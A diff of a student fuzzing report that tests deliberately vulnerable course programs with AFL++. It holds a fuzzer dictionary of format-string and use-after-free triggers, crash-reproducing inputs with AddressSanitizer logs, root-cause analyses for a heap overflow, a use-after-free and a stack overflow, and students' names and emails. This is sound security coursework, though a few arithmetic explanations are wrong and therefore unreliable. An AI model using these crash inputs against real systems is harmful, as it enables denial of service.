@@ -6,9 +6,9 @@
 ### Team Members & Workload Distribution
 | Student Name | Student ID | Email Address | Assigned Subtasks / Roles | Contribution (%) |
 | :--- | :--- | :--- | :--- | :--- |
-| `Claire Lin`   | `[n0000001]`  | `c229.lin@connect.qut.edu.au`    | `Fuzz testing of sentinel_telemetry.c` | 33.3% |
-| `Rachel Lim`  | `[n0000002]`  | `r20.lim@connect.qut.edu.au`     | `Fuzz testing of sentinel_payload.c`   | 33.3% |
-| `Kaito Ozawa` | `[n12224774]` | `kaito.ozawa@connect.qut.edu.au` | `Fuzz testing of sentinel_network.c`   | 33.3% |
+| `Claire Lin`  | `[n0000001]`  | `c229.lin@connect.qut.edu.au`    | `Fuzzing of sentinel_telemetry.c` | 33.3% |
+| `Rachel Lim`  | `[n12284181]` | `r20.lim@connect.qut.edu.au`     | `Fuzzing of sentinel_payload.c`   | 33.3% |
+| `Kaito Ozawa` | `[n12224774]` | `kaito.ozawa@connect.qut.edu.au` | `Fuzzing of sentinel_network.c`   | 33.3% |
 
 **Submission Files (Canvas):**
 - `Group_01.pdf` (compiled from this completed Markdown report template)
@@ -46,9 +46,6 @@
 
 sentinel_telemetry
 ```bash
-# Environment configuration
-echo core | sudo tee /proc/sys/kernel/core_pattern
-
 # Compilation commands with AFL++ instrumentation
 afl-clang-fast -g -o sentinel_telemetry_nosan sentinel_telemetry.c
 
@@ -60,18 +57,21 @@ afl-clang-fast -g -o sentinel_telemetry_asan_ubsan sentinel_telemetry.c
 
 sentinel_payload
 ```bash
-echo core | sudo tee /proc/sys/kernel/core_pattern
-
 # Compilation commands with AFL++ instrumentation
+afl-clang-fast -m32 -std=c99 -w -g -o sentinel_payload_nosan sentinel_payload.c
 
 # Compilation commands with AddressSanitizer and UndefinedBehaviorSanitizer
+export AFL_USE_ASAN=1
+export AFL_USE_UBSAN=1
+afl-clang-fast -m32 -std=c99 -w -g -o sentinel_payload_asan_ubsan sentinel_payload.c
 
+# Compilation commands with MemorySanitizer
+export AFL_USE_MSAN=1
+afl-clang-fast -std=c99 -w -g -o sentinel_payload_msan sentinel_payload.c
 ```
 
 sentinel_network
 ```bash
-echo core | sudo tee /proc/sys/kernel/core_pattern
-
 # Compilation commands with AFL++ instrumentation
 afl-clang-fast -m32 -std=c99 -w -g -o sentinel_network_nosan sentinel_network.c
 
@@ -95,10 +95,12 @@ AFL_USE_MSAN=1 afl-clang-fast -std=c99 -w -g -o sentinel_network_msan sentinel_n
 #### Target 2: `sentinel_payload` Seed Set
 | Seed Filename | Dimensions & Label | Payload Size | Target Branch / Parsing State Exercised |
 | :--- | :--- | :--- | :--- |
-| `seed_payload.bin` | `PAYLOAD_FRAME 8 8 1 RADAR_SCAN_01` | 64 bytes | Standard 2D observation matrix |
-| `seed_pay_2.bin` | `[Describe parameters]` | `[Size]` | `[Describe branch/rationale]` |
-| `seed_pay_3.bin` | `[Describe parameters]` | `[Size]` | `[Describe branch/rationale]` |
-| `seed_pay_X.bin` | `[Describe parameters]` | `[Size]` | `[Describe branch/rationale]` |
+| `seed_payload.bin`   | `PAYLOAD_FRAME 8 8 1 RADAR_SCAN_01` | 64 bytes | Standard 2D observation matrix |
+| `seed_payload_1.bin` | `PAYLOAD_FRAME 1 1 1 A`  | 1 byte | Exercises the minimum valid label and payload boundary. |
+| `seed_payload_2.bin` | `PAYLOAD_FRAME 8 8 16 B` | 1024 bytes | Exercises the maximum valid payload boundary. |
+| `seed_payload_3.bin` | `PAYLOAD_FRAME 1 1 1 CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC` | 1 byte | Exercises the maximum valid label boundary. |
+| `seed_payload_4.bin` | `PAYLOAD_FRAME 1 1 1`    | 1 byte | Exercises the jump to log_payload_error() with a single whitespace label. |
+| `seed_payload_5.bin` | `PAYLOAD_FRAME 2 4 8 E`  | 128 bytes | Exercises fread() using a valid payload larger than expected_data_size. |
 
 #### Target 3: `sentinel_network` Seed Set
 | Seed Filename | Magic Header & Type | Payload Length | Target Branch / Parsing State Exercised |
@@ -110,15 +112,31 @@ AFL_USE_MSAN=1 afl-clang-fast -std=c99 -w -g -o sentinel_network_msan sentinel_n
 
 ### 2.3 Seed Generation Methodology & Helper Scripts
 
-sentinel_telemetry: `No helper script was needed.`
+#### sentinel_telemetry: `No helper script was needed.`
 The additional seeds were manually created using the valid `key=value` format and different inputs handled by `sentinel_telemetry.c`.
 
-sentinel_payload: ~~.py
+#### sentinel_payload: `generate_seed_payload.py`
+The helper script shown below demonstrates seed generation for `seed_payload_5.bin`. The sentinel_payload program expects a file input containing a header line with exactly four values: width, height, depth, and label. A payload should follow after the newline.
+
 ```python
-## if needed (might not be necessary)
+"""
+Generate a file input for the sentinel_payload program.
+"""
+
+width = 2
+height = 4
+depth = 8
+label = "E"
+
+header_line = f"PAYLOAD_FRAME {width} {height} {depth} {label}\n"
+payload = b"E" * 128
+
+with open("seed_payload_5.bin", "wb") as f:
+    f.write(header_line.encode("ascii"))
+    f.write(payload)
 ```
 
-sentinel_network: seeds_net.py
+#### sentinel_network: seeds_net.py
 ```python
 import struct
 
@@ -172,13 +190,67 @@ The baseline campaign was used to check the initial fuzzing results. The diction
 
 #### sentinel_payload
 
-```bash
-# Example AFL++ execution commands used by your team
+To enable persistent mode, the `main()` function in `sentinel_payload.c` was modified:
+```c
+int old_main(int argc, char **argv) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <payload_binary_file>\n", argv[0]);
+        return 1;
+    }
+    
+    FILE *fp = fopen(argv[1], "rb");
+    if (!fp) {
+        perror("Failed to open scientific payload file");
+        return 1;
+    }
+    
+    printf("=== Sentinel-1 Scientific Payload Ingestion Subsystem ===\n");
+    int result = parse_payload_file(fp);
+    
+    fclose(fp);
+    cleanup_active_frame();
+    
+    return (result == 0) ? 0 : 1;
+}
 
+int main(int argc, char **argv) {
+    int res = 0;
+    while (__AFL_LOOP(10000)) {
+        global_frame = NULL;
+        res = old_main(argc, argv);
+    }
+    return res;
+}
+```
+
+To improve fuzzer mutations, a simple fuzzer dictionary (i.e., `sentinel_payload.dict`) was created:
+```
+header="PAYLOAD_FRAME"
+format_string_trigger_1="%n"
+format_string_trigger_2="%x"
+uaf_trigger="1337"
+```
+
+Parallel, dictionary-assisted fuzzing was conducted on:
+- An AFL++ instrumented and unsanitised sentinel_payload program.
+- An AFL++ instrumented with ASan and UBSan enabled sentinel_payload program.
+- An AFL++ instrumented with MSan enabled sentinel_payload program.
+
+```bash
+echo core | sudo tee /proc/sys/kernel/core_pattern
+afl-fuzz -i seeds -o out -x sentinel_payload.dict -m none -M nosan ./sentinel_payload_nosan @@
+afl-fuzz -i seeds -o out -x sentinel_payload.dict -m none -S asan_ubsan ./sentinel_payload_asan_ubsan @@
+afl-fuzz -i seeds -o out -x sentinel_payload.dict -m none -S msan ./sentinel_payload_msan @@
 ```
 
 **Technical Justification:**
-`[Explain why these options and techniques were chosen and how they improved coverage/efficiency]`
+Enabling persistent mode in AFL++ removes the significant overhead associated with restarting the process after every test case. This improves fuzzing efficiency and execution speed, allowing a greater number of test cases to be executed per second.
+
+The fuzzer dictionary, `sentinel_payload.dict`, was used to ensure that generated inputs contained the minimum required structure to pass the initial header line validation. Specifically, inputs must contain the string `PAYLOAD_FRAME`, followed by `width`, `height`, `depth`, and `label` values, in order to reach subsequent processing functions. The dictionary also includes format string and use-after-free (UAF) triggers, enabling the exploration of distinct execution paths and increasing the likelihood of exposing vulnerabilities.
+
+Parallelisation was utilised to run multiple fuzzing instances simultaneously. Each instance targeted different AFL++ instrumentation variants of the `sentinel_payload` program. This increases overall throughput and enables different execution paths to be explored concurrently.
+
+Lastly, the `-m none` option was applied to all fuzzing instances to disable AFL++'s memory limit. This further improved execution speeds.
 
 #### sentinel_network
 
@@ -237,18 +309,21 @@ Persistent mode (`__AFL_LOOP`) removes the cost of starting a new process for ea
 | Target Program | Campaign Duration | Total Executions | Execution Speed (exec/s) | Total Paths Discovered | Unique Crashes Reported |
 | :--- | :--- | :--- | :--- | :--- | :--- |
 | `sentinel_telemetry` | 1.16 hours | 758K | 23.67/sec | 166 paths | 24 crashes |
-| `sentinel_payload` | `[Hours]` | `[Executions]` | `[Exec/sec]` | `[Paths]` | `[Crashes]` | 
+| `sentinel_payload` | 3.0 hours | 67M | 18,582/sec | 24 paths | 12 crashes | 
 | `sentinel_network` | 2.4 hours | 22M | 2,630/sec | 72 paths | 103 crashes |
 
 ### 3.3 AFL++ Status Console Screenshots
 
 sentinel_telemetry
+
 ![sentinel_telemetry AFL++ Status Screen](images/sentinel_telemetry/sentinel_telemetry_afl_status_screen_dict.jpg)
 
 sentinel_payload
-```
-[Insert Screenshot: sentinel_payload AFL++ Status Screen]
-```
+
+![sentinel_payload_nosan AFL++ Status Screen](images/sentinel_payload/sentinel_payload_01_nosan.png)
+![sentinel_payload_asan_ubsan AFL++ Status Screen](images/sentinel_payload/sentinel_payload_02_asan_ubsan.png)
+![sentinel_payload_msan AFL++ Status Screen](images/sentinel_payload/sentinel_payload_03_msan.png)
+![sentinel_payload AFL++ Summary Stats](images/sentinel_payload/sentinel_payload_04_aggregate_stats.png)
 
 sentinel_network
 
@@ -261,11 +336,9 @@ sentinel_network
 ## 4. Task 3: Vulnerability Analysis
 
 ### 4.1 Crash Triage Methodology
-
 The same methodology was applied to all three targets. In the commands below, `{target}` is one of `telemetry`, `payload`, or `network`.
 
 #### 1. replay all crashes with the ASan build and save full logs
-
 ```bash
 mkdir -p crash_logs
 for f in findings/*/crashes/id:*; do
@@ -276,7 +349,6 @@ done
 ```
 
 #### 2. build a bucket key (error type + top 3 frames) for each crash
-
 ```bash
 for log in crash_logs/*.log; do
   key=$(awk '
@@ -297,7 +369,6 @@ done > crash_buckets.tsv
 ```
 
 #### 3. count crashes per bucket, pick one representative crash and minimise it
-
 ```bash
 mkdir -p crash_analysis
 declare -A num                                                   # per-error-type counter
@@ -317,7 +388,6 @@ awk -F'\t' '
 ```
 
 #### 4. validate and inspect each representative crash
-
 After minimisation, verify whether a valid minimised `.bin` file is produced and still reproduces the crash. Follow Step 4-1 if a valid minimised file is available; otherwise, follow Step 4-2 using the original representative crash.
 
 ##### 4-1. inspect a successfully minimised representative
@@ -326,21 +396,17 @@ After minimisation, verify whether a valid minimised `.bin` file is produced and
 ```
 
 ##### 4-2. Inspect the original representative if no valid minimised file is available
-
 If no valid minimised `.bin` file is produced, use the original representative crash instead:
-
 ```bash
 ./sentinel_{target}_asan_ubsan {original_representative_crash}
 ```
 
 If the result is unclear, check the crash manually with GDB:
-
 ```bash
 gdb ./sentinel_{target}_asan_ubsan
 ```
 
 Then run:
-
 ```gdb
 run {original_representative_crash}
 ```
@@ -348,7 +414,6 @@ run {original_representative_crash}
 Check the sanitizer/GDB output against the source code.
 
 #### 5. decode the input as a packet sequence (`network` only)
-
 ```bash
 xxd crash_analysis/{name}.bin
 ```
@@ -590,6 +655,394 @@ A crafted `stream_multiplier` can terminate the telemetry processor during the s
 
 ---
 
+#### 4.2.7 `sentinel_payload` Vulnerability 1
+
+| Field                  | Details |
+| :--------------------- | :------ |
+| Vulnerability Name     | Heap Buffer Overflow |
+| CWE Classification     | CWE-122: Heap-Based Buffer Overflow |
+| Target Component       | `sentinel_payload.c` |
+| Vulnerable Location    | `fread()`, line 119, `fread(stream_data, 1, expected_data_size, fp);` |
+| Reproducing Input File | `sentinel_payload/out/nosan/crashes/id\:000003\,sig\:11\,src\:000001\,time\:17339\,execs\:349023\,op\:havoc\,rep\:7` |
+
+**Triggering Input & Reproduction Command:**
+
+```
+PAYLOAD_FRAME 1 1 1111111111111111111BBBBB1111 B
+%PAYLOAD_FRAME 1 1 0 
+xA
+```
+
+```bash
+./sentinel_payload_asan_ubsan crash_analysis/heap-buffer-overflow01.bin
+```
+
+**Root Cause Analysis:**
+
+The header line, `PAYLOAD_FRAME 1 1 1111111111111111111BBBBB1111 B`, is parsed by the `sscanf()` function as follows:
+
+| Variable       | Value |
+| :------------- | :---- |
+| `width`        | `1`   |
+| `height`       | `1`   |
+| `depth`        | `1111111111111111111` |
+| `label_buffer` | `BBBBB1111` |
+
+The value of `depth` is formatted into a 32-bit unsigned integer with the `%u` format specifier. However, 32-bit unsigned integers can only hold up to 4,294,967,295 values (i.e., 2 ^ (32 - 1)). As 1,111,111,111,111,111,111 is significantly larger than 4,294,967,295, the `%u` format specifier is forced to translate `1111111111111111111` into the maximum possible 32-bit unsigned integer value: `4294967295`.
+
+When the `malloc()` function is called on line 113, the `stream_data` variable of unsigned integer data type (i.e., `size_t`) is essentially allocated a memory size of `4294967295 + 1`. This evaluates to `0` and causes the `fread()` function to trigger a heap buffer overflow when it attempts to store the 25 bytes read into a 0-byte memory.
+
+**GDB / Sanitiser Evidence:**
+
+```bash
+rachel@RCHL-LTPX1:~/ifn657_assignment_2/sentinel_payload$ ./sentinel_payload_asan_ubsan crash_analysis/heap-buffer-overflow01.bin
+=== Sentinel-1 Scientific Payload Ingestion Subsystem ===
+Processing observation frame label: BBBBB1111
+Payload frame dimensions: 1 x 1 x 4294967295 (4294967295 bytes required)
+=================================================================
+==1873==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf5700791 at pc 0x5665c5bd bp 0xffebcf48 sp 0xffebcb1c
+WRITE of size 25 at 0xf5700791 thread T0
+    #0 0x5665c5bc in fread (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0x3b5bc) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8)
+    #1 0x5672a5ec in parse_payload_file /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:119:27
+    #2 0x5672ac72 in old_main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:148:18
+    #3 0x5672b147 in main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:160:15
+    #4 0xf7b4af5b  (/usr/lib32/libc.so.6+0x25f5b) (BuildId: b2f9ff1a775a2a827a847840bcabf5c682d5109a)
+    #5 0xf7b4b097 in __libc_start_main (/usr/lib32/libc.so.6+0x26097) (BuildId: b2f9ff1a775a2a827a847840bcabf5c682d5109a)
+    #6 0x5663d636 in _start (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0x1c636) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8)
+
+0xf5700791 is located 0 bytes after 1-byte region [0xf5700790,0xf5700791)
+allocated by thread T0 here:
+    #0 0x566dfd11 in malloc (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0xbed11) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8)
+    #1 0x5672a5d3 in parse_payload_file /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:113:33
+    #2 0x5672ac72 in old_main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:148:18
+    #3 0x5672b147 in main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:160:15
+    #4 0xf7b4af5b  (/usr/lib32/libc.so.6+0x25f5b) (BuildId: b2f9ff1a775a2a827a847840bcabf5c682d5109a)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0x3b5bc) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8) in fread
+Shadow bytes around the buggy address:
+  0xf5700500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf5700580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf5700600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf5700680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf5700700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+=>0xf5700780: fa fa[01]fa fa fa 00 00 fa fa fa fa fa fa fa fa
+  0xf5700800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf5700880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf5700900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf5700980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf5700a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==1873==ABORTING
+```
+
+**Exploitability Assessment:**
+
+The heap buffer overflow vulnerability can impact the availability of the system. Successful exploitation can result in denial of service by crashing. According to CWE, CWE-122 Heap-Based Buffer Overflow has a high likelihood of exploitation. An attacker can easily supply a value exceeding the maximum limit of a 32-bit unsigned integer. The likelihood is further increased by the expanded attack surface, as the system expects and processes three user-supplied unsigned integer values (i.e., `width`, `height`, and `depth`) from the payload's header line, each of which could potentially trigger the heap buffer overflow. The non-zero risk of human error and lack of user input validation is another contributing factor. Based on the NIST guidelines, the overall security impact of this vulnerability is considered moderate.
+
+---
+
+#### 4.2.8 `sentinel_payload` Vulnerability 2
+
+| Field                  | Details |
+| :--------------------- | :------ |
+| Vulnerability Name     | Heap Use-After-Free |
+| CWE Classification     | CWE-416: Use After Free |
+| Target Component       | `sentinel_payload.c` |
+| Vulnerable Location    | `inspect_cached_frame()`, line 129, `inspect_cached_frame();` |
+| Reproducing Input File | `sentinel_payload/out/asan_ubsan/crashes/id\:000003\,sig\:06\,src\:000007\,time\:795\,execs\:3840\,op\:havoc\,rep\:1` |
+
+**Triggering Input & Reproduction Command:**
+
+```
+PAYLOAD_FRAME1337 8 8 11111111111111AA
+```
+
+```bash
+./sentinel_payload_asan_ubsan crash_analysis/heap-use-after-free01.bin
+```
+
+**Root Cause Analysis:**
+
+The header line, `PAYLOAD_FRAME1337 8 8 11111111111111AA`, is parsed by the `sscanf()` function as follows:
+
+| Variable       | Value |
+| :------------- | :---- |
+| `width`        | `1337` |
+| `height`       | `8`   |
+| `depth`        | `8`   |
+| `label_buffer` | `11111111111111AA` |
+
+The source code contains a specific frame inspection trigger on line 127: when `width` is equal to 1337, the `cleanup_active_frame()` and `inspect_cached_frame()` functions are called consecutively. As the `cleanup_active_frame()` function only frees `global_frame` and `global_frame->data` without setting to `NULL`, it creates two dangling pointers that become use-after-free (UAF) vulnerabilities. The `inspect_cached_frame()` function immediately dereferences both `global_frame` and `global_frame->data`, which triggers the UAF and crashes the program.
+
+**GDB / Sanitiser Evidence:**
+
+```bash
+rachel@RCHL-LTPX1:~/ifn657_assignment_2/sentinel_payload$ ./sentinel_payload_asan_ubsan crash_analysis/heap-use-after-free01.bin
+=== Sentinel-1 Scientific Payload Ingestion Subsystem ===
+Processing observation frame label: 11111111111111AA
+Payload frame dimensions: 1337 x 8 x 8 (85568 bytes required)
+Read 0 bytes from payload observation stream.
+Transferred 0 bytes into observation buffer.
+Active observation frame released from cache.
+=================================================================
+==1825==ERROR: AddressSanitizer: heap-use-after-free on address 0xf4e00f54 at pc 0x5672cb2e bp 0xff9c8708 sp 0xff9c8700
+READ of size 4 at 0xf4e00f54 thread T0
+    #0 0x5672cb2d in inspect_cached_frame /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:56:71
+    #1 0x5672cb2d in parse_payload_file /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:129:9
+    #2 0x5672cc72 in old_main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:148:18
+    #3 0x5672d147 in main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:160:15
+    #4 0xf7bfff5b  (/usr/lib32/libc.so.6+0x25f5b) (BuildId: b2f9ff1a775a2a827a847840bcabf5c682d5109a)
+    #5 0xf7c00097 in __libc_start_main (/usr/lib32/libc.so.6+0x26097) (BuildId: b2f9ff1a775a2a827a847840bcabf5c682d5109a)
+    #6 0x5663f636 in _start (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0x1c636) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8)
+
+0xf4e00f54 is located 4 bytes inside of 44-byte region [0xf4e00f50,0xf4e00f7c)
+freed by thread T0 here:
+    #0 0x566e1a8e in free (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0xbea8e) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8)
+    #1 0x5672c751 in cleanup_active_frame /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:49:9
+    #2 0x5672c751 in parse_payload_file /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:128:9
+    #3 0x5672cc72 in old_main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:148:18
+    #4 0x5672d147 in main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:160:15
+    #5 0xf7bfff5b  (/usr/lib32/libc.so.6+0x25f5b) (BuildId: b2f9ff1a775a2a827a847840bcabf5c682d5109a)
+
+previously allocated by thread T0 here:
+    #0 0x566e1d11 in malloc (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0xbed11) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8)
+    #1 0x5672c059 in process_payload_data /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:67:43
+    #2 0x5672c60e in parse_payload_file /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:122:5
+    #3 0x5672cc72 in old_main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:148:18
+    #4 0x5672d147 in main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:160:15
+    #5 0xf7bfff5b  (/usr/lib32/libc.so.6+0x25f5b) (BuildId: b2f9ff1a775a2a827a847840bcabf5c682d5109a)
+
+SUMMARY: AddressSanitizer: heap-use-after-free /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:56:71 in inspect_cached_frame
+Shadow bytes around the buggy address:
+  0xf4e00c80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf4e00d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf4e00d80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf4e00e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf4e00e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+=>0xf4e00f00: fa fa fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd
+  0xf4e00f80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf4e01000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf4e01080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf4e01100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0xf4e01180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==1825==ABORTING
+```
+
+**Exploitability Assessment:**
+
+The heap use-after-free vulnerability can impact the integrity and availability of the system. Successful exploitation can result in unintended modification of the heap and denial of service by crashing. According to CWE, there is a high likelihood of exploitation. An attacker can easily and reliably exploit the heap use-after-free vulnerability by setting `width` to `1337`. Based on the NIST guidelines, the overall security impact of this vulnerability is considered moderate.
+
+---
+
+#### 4.2.9 `sentinel_payload` Vulnerability 3
+
+| Field                  | Details |
+| :--------------------- | :------ |
+| Vulnerability Name     | Stack Buffer Overflow |
+| CWE Classification     | CWE-121: Stack-Based Buffer Overflow |
+| Target Component       | `sentinel_payload.c` |
+| Vulnerable Location    | `strcpy()`, line 29, `strcpy(local_label, label);` |
+| Reproducing Input File | `sentinel_payload/out/asan_ubsan/crashes/id\:000001\,sig\:06\,src\:000000\,time\:147\,execs\:670\,op\:havoc\,rep\:4` |
+
+**Triggering Input & Reproduction Command:**
+
+```
+PAYLOAD_FRAME 8 8         1 RADAR_SCACCCCCCCCCCCCCCCBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAA
+```
+
+```bash
+./sentinel_payload_asan_ubsan crash_analysis/stack-buffer-overflow01.bin
+```
+
+**Root Cause Analysis:**
+
+The header line, `PAYLOAD_FRAME 8 8         1 RADAR_SCACCCCCCCCCCCCCCCBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAA`, is parsed by the `sscanf()` function as follows:
+
+| Variable       | Value |
+| :------------- | :---- |
+| `width`        | `8`   |
+| `height`       | `8`   |
+| `depth`        | `1`   |
+| `label_buffer` | `RADAR_SCACCCCCCCCCCCCCCCBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAA` |
+
+The `label_buffer` array is declared with an array size of 128 bytes, this is double the array size of `local_label` located in the `process_frame_label()` function. The program attempts to store the 66-byte string into the 64-byte buffer defined by `MAX_LABEL_LEN`, which results in a crash.
+
+**GDB / Sanitiser Evidence:**
+
+```bash
+rachel@RCHL-LTPX1:~/ifn657_assignment_2/sentinel_payload$ ./sentinel_payload_asan_ubsan crash_analysis/stack-buffer-overflow01.bin
+=== Sentinel-1 Scientific Payload Ingestion Subsystem ===
+=================================================================
+==1767==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xf6800050 at pc 0x566be803 bp 0xffd33b08 sp 0xffd336dc
+WRITE of size 67 at 0xf6800050 thread T0
+    #0 0x566be802 in strcpy (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0xa4802) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8)
+    #1 0x56723566 in process_frame_label /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:29:5
+    #2 0x56723566 in parse_payload_file /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:103:5
+    #3 0x56723c72 in old_main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:148:18
+    #4 0x56724147 in main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:160:15
+    #5 0xf7b1bf5b  (/usr/lib32/libc.so.6+0x25f5b) (BuildId: b2f9ff1a775a2a827a847840bcabf5c682d5109a)
+    #6 0xf7b1c097 in __libc_start_main (/usr/lib32/libc.so.6+0x26097) (BuildId: b2f9ff1a775a2a827a847840bcabf5c682d5109a)
+    #7 0x56636636 in _start (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0x1c636) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8)
+
+Address 0xf6800050 is located in stack of thread T0 at offset 80 in frame
+    #0 0x567233b7 in parse_payload_file /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:88
+
+  This frame has 6 object(s):
+    [16, 80) 'local_label' (line 28)
+    [112, 368) 'header_line' (line 89) <== Memory access at offset 80 partially underflows this variable
+    [432, 560) 'label_buffer' (line 90)
+    [592, 596) 'width' (line 91)
+    [608, 612) 'height' (line 91)
+    [624, 628) 'depth' (line 91)
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_asan_ubsan+0xa4802) (BuildId: ee7803d924b2699b554e434f9a2970d030f342c8) in strcpy
+Shadow bytes around the buggy address:
+  0xf67ffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0xf67ffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0xf67ffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0xf67fff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0xf67fff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0xf6800000: f1 f1 00 00 00 00 00 00 00 00[f2]f2 f2 f2 00 00
+  0xf6800080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0xf6800100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2
+  0xf6800180: f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00
+  0xf6800200: 00 00 00 00 00 00 f2 f2 f2 f2 04 f2 04 f2 04 f3
+  0xf6800280: f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
